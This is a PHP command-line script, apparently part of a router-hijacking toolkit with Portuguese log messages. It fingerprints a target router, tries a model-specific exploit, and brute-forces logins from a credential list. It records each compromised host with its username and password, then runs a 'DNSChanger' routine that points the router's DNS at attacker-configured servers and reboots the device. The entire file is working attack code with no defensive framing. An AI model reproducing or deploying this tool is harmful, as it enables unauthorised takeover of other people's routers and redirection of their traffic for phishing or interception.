#!/usr/bin/php -q
<?php
require_once(str_replace('\\','/',realpath(dirname(__FILE__)))."/../application/config.init.php");
date_default_timezone_set('America/Sao_Paulo');
$dataLocal = date('d/m/Y H:i:s', time());

function logIT($logFile, $logText)
{
	$logText = $logText . "\n";
	$logHandler = fopen($logFile, 'a') or die("[!] can't open log file: $logFile");
	fwrite($logHandler, $logText);
	fclose($logHandler);
}


$Host           =   $argv[1];
$Result         =    array();
$Count 	        =   count($Routers)-1;
$Found          =   false;
$Model          =   null;
$ExploitStatus  =   false;
$setCustomUser  =   false;
$NeedBrute      = true;
if (1 == 1)
{
	

	$Request                = $WebRequest->Get($Host,"brute:force");
	@flush();
	//echo $Request;
	$Parsed                 = "{$Host}".$WebRequest->Parse($Request);
 //  logIT(str_replace('\\','/',realpath(dirname(__FILE__)))."/../application/logs/found/crawled.log",$Parsed);
	
	for ($i = 0; $i <= $Count;  $i++)
	{
		$isOnStatus = ( strpos($Request ,$Routers[$i]["status"])         !== false) ? true : false;
		$isOnHeader = ( strpos($Request ,$Routers[$i]["matchstring"])    !== false) ? true : false;
			
	    if ($isOnStatus && $isOnHeader)
		{
			echo "\r\n[ + ] Router Found : ". $Routers[$i]["name"]."\r\n";
			$Found = true;
			break;
		}
			
    }
	if ($Found) {
        echo "------------------------------------------------------------------\r\n";
        if ($Routers[$i]["exploit"] == true) {
            $ExploitStatus = $Routers[$i]["class"]->Exploit($Host);
            if ($ExploitStatus) {
                $User               = $Routers[$i]["class"]->User;
                $Pass               = $Routers[$i]["class"]->Pass;
                $setCustomUser          = true;
                echo "[ + ] Exploit Status : Success \r\n";
            } else {
                $NeedBrute = true;
                echo "[ + ] Exploit Status : Failed \r\n";
            }
        }




            echo "------------------------------------------------------------------\r\n";
            echo "[ + ] Starting Bruteforce \r\n";
            foreach ($Credentials as $CurrentData)
            {

                $Data = explode(":", $CurrentData);
                if (!$setCustomUser) {
                    $User = $Data[0];
                    $Pass = $Data[1];
                    if (empty($User)) { $User = "";}
                    if (empty($Pass)) { $Pass = "";}
                }


                $LoginStatus = $Routers[$i]["class"]->Login($Host, $User, $Pass);
				@flush();
                if ($NeedBrute == false || $LoginStatus )
                {

                    echo "[ + ] BruteForce Status : Login(\"$User\",\"$Pass\") Success! \r\n";
                    break;
                } else {
                    echo "[ + ] BruteForce Status : Login(\"$User\",\"$Pass\") Failed! \r\n";
                }
            }

            if ($LoginStatus)
            {
		$Parsed = "{$Host}|".$Routers[$i]["name"]."|{$User}|{$Pass}";
		logIT(str_replace('\\','/',realpath(dirname(__FILE__)))."/../application/logs/found/crawled.log",$Parsed);

                echo "------------------------------------------------------------------\r\n";
                echo "[ + ] DNSChanger Launched! \r\n";
                $Routers[$i]["class"]->ChangeDNS($Host, $User, $Pass, $Configs["DNS"]["Servers"]["IPV4"][1], $Configs["DNS"]["Servers"]["IPV4"][2]);
                echo "------------------------------------------------------------------\r\n";
                echo "[ + ] Rebooting Target! \r\n";
                $Routers[$i]["class"]->DoOthers($Host, $User, $Pass);
            }

	} else {
	    echo "\r\n[ + ] Router nao cadastrado! \r\n";
		echo $Request;
	}


}
